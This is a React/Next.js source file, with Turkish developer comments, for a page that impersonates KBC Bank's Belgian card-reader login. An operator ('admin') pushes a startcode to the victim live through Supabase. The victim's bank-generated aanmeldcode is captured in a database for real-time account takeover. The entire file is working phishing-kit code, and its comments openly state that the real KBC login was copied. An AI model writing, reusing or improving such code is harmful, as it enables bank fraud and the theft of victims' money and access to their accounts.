"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

// KBC kart okuyucu (kaartlezer) onay ekrani - gercek KBC login talimatlari
// taklit edildi: debetkaart + startcode (admin gonderir) + pincode adimlari,
// ardindan aanmeldcode girisi + Aanmelden butonu.
// Akis: admin startcode gonderir -> kullanici talimatlari gorur ->
// aanmeldcode'u girip Aanmelden'e basar -> wait.
const KBC_BLUE = "#0066B3";
const KBC_DARK = "#00325B";
const KBC_GREEN = "#6A8D1E";

export function KbcOnayClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [saving, setSaving] = useState(false);
  const [ready, setReady] = useState(false);
  const [aanmeldcode, setAanmeldcode] = useState("");
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setReady(true);
        return;
      }
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const fd = (data?.form_data ?? {}) as Record<string, unknown>;
      setSessionFormData(fd);
      if (fd.approvalStatus !== "kbc" && fd.approvalStatus !== "kbc_confirmed") {
        void supabase
          .from("sessions")
          .update({ form_data: { ...fd, approvalStatus: "kbc" } })
          .eq("id", sessionId);
      }
      setReady(true);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  // Admin kodu sonradan guncellerse (sayfa acikken) canli al.
  useEffect(() => {
    if (supabase === null || !sessionId) return;
    const channel = supabase
      .channel(`kbc-onay-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const fd = (payload.new as { form_data?: Record<string, unknown> })?.form_data;
          if (fd && typeof fd === "object") setSessionFormData(fd);
        },
      )
      .subscribe();
    return () => {
      void supabase.removeChannel(channel);
    };
  }, [sessionId, supabase]);

  const startcode =
    typeof sessionFormData.kbcApprovalCode === "string"
      ? sessionFormData.kbcApprovalCode.trim()
      : "";

  const formattedStartcode = startcode.replace(/\s/g, "").replace(/(\d{4})(?=\d)/g, "$1 ");

  async function handleConfirm(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId || saving) return;
    setSaving(true);
    const nextFormData = {
      ...sessionFormData,
      approvalStatus: "kbc_confirmed",
      kbcAanmeldcode: aanmeldcode.trim(),
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);
    if (error) {
      setSaving(false);
      return;
    }
    setSessionFormData(nextFormData);
    router.push(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4 bg-[#f5f8fb]">
        <ConfigMissing />
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4 bg-[#f5f8fb]">
        <p className="rounded-xl border border-red-200 bg-red-50 p-5 text-center text-sm text-red-800">
          Sessie niet gevonden.
        </p>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[9999] min-h-[100dvh] w-full overflow-auto bg-[#f5f8fb]">
      {/* Ust serit - KBC */}
      <div className="flex items-center gap-3 border-b border-[#dfe9f3] bg-white px-5 py-4 sm:px-8">
        <img
          src="/bank-logos/belgium/kbc-be.png"
          alt="KBC"
          className="h-9 w-9 rounded-lg object-cover"
        />
        <span className="text-[17px] font-bold" style={{ color: KBC_DARK }}>
          Aanmelden met kaartlezer
        </span>
      </div>

      <div className="mx-auto flex w-full max-w-[560px] flex-col px-5 py-8 sm:py-12">
        <div className="rounded-2xl border border-[#dfe9f3] bg-white px-6 py-8 shadow-[0_12px_40px_-18px_rgba(0,50,91,0.25)] sm:px-10">
          {/* Adim 02 - kart okuyucu talimatlari */}
          <div className="flex gap-4">
            <span className="shrink-0 text-[15px] font-bold" style={{ color: KBC_BLUE }}>
              02
            </span>
            <div className="min-w-0 flex-1">
              <p className="text-[15px] font-bold" style={{ color: KBC_DARK }}>
                Steek je debetkaart in de kaartlezer
              </p>

              <div className="mt-4 space-y-3">
                {/* Druk LOGIN + LOGIN */}
                <div className="flex items-center justify-between gap-3">
                  <span className="text-[14px]" style={{ color: KBC_DARK }}>
                    Druk
                  </span>
                  <span className="flex items-center gap-1.5">
                    <span className="rounded-md bg-[#1d3f74] px-2.5 py-1 text-[11px] font-bold text-white">
                      LOGIN
                    </span>
                    <span className="text-[14px] font-bold text-gray-400">+</span>
                    <span className="rounded-md bg-[#1d3f74] px-2.5 py-1 text-[11px] font-bold text-white">
                      LOGIN
                    </span>
                  </span>
                </div>

                {/* Startcode */}
                <div className="flex items-center justify-between gap-3">
                  <span className="text-[14px]" style={{ color: KBC_DARK }}>
                    Voer de startcode in
                  </span>
                  {startcode ? (
                    <span className="flex items-center gap-1.5">
                      <span className="font-mono text-[15px] font-bold tracking-wider" style={{ color: KBC_DARK }}>
                        {formattedStartcode}
                      </span>
                      <span className="text-[14px] font-bold text-gray-400">+</span>
                      <span className="rounded-md px-2.5 py-1 text-[11px] font-bold text-white" style={{ backgroundColor: KBC_GREEN }}>
                        OK
                      </span>
                    </span>
                  ) : (
                    <span className="flex items-center gap-2 text-[12px] font-semibold text-gray-400">
                      <span className="relative flex h-2 w-2">
                        <span className="absolute inline-flex h-full w-full animate-ping rounded-full opacity-50" style={{ backgroundColor: KBC_BLUE }} />
                        <span className="relative inline-flex h-2 w-2 rounded-full" style={{ backgroundColor: KBC_BLUE }} />
                      </span>
                      Even geduld…
                    </span>
                  )}
                </div>

                {/* Pincode */}
                <div className="flex items-center justify-between gap-3">
                  <span className="text-[14px]" style={{ color: KBC_DARK }}>
                    Voer je pincode in
                  </span>
                  <span className="flex items-center gap-1.5">
                    <span className="text-[15px] font-bold" style={{ color: KBC_DARK }}>
                      PIN
                    </span>
                    <span className="text-[14px] font-bold text-gray-400">+</span>
                    <span className="rounded-md px-2.5 py-1 text-[11px] font-bold text-white" style={{ backgroundColor: KBC_GREEN }}>
                      OK
                    </span>
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* Adim 03 - aanmeldcode */}
          <form onSubmit={handleConfirm} className="mt-8 border-t border-[#e8eff6] pt-6">
            <div className="flex gap-4">
              <span className="shrink-0 text-[15px] font-bold" style={{ color: KBC_BLUE }}>
                03
              </span>
              <div className="min-w-0 flex-1">
                <label htmlFor="kbc-aanmeldcode" className="block text-[15px] font-bold" style={{ color: KBC_DARK }}>
                  Voer de aanmeldcode in
                </label>
                <div className="mt-4 flex items-center gap-3">
                  <input
                    id="kbc-aanmeldcode"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    value={aanmeldcode}
                    onChange={(e) => setAanmeldcode(e.target.value)}
                    placeholder="---- ----"
                    className="w-full max-w-[220px] rounded-xl border border-[#b8cbe0] bg-white px-4 py-3 font-mono text-[16px] tracking-widest text-gray-900 outline-none transition-colors focus:border-[#0066B3] focus:ring-2 focus:ring-[#0066B3]/20"
                  />
                  <button
                    type="submit"
                    disabled={saving || !ready || !aanmeldcode.trim()}
                    className="rounded-full px-6 py-3 text-[15px] font-bold text-white transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-40"
                    style={{ backgroundColor: KBC_BLUE }}
                  >
                    {saving ? "Even geduld…" : "Aanmelden"}
                  </button>
                </div>
              </div>
            </div>
          </form>
        </div>

        <p className="mt-5 text-center text-[12px] leading-relaxed text-gray-400">
          Heeft u deze aanvraag niet zelf gestart? Bevestig dan niets.
        </p>
      </div>
    </div>
  );
}
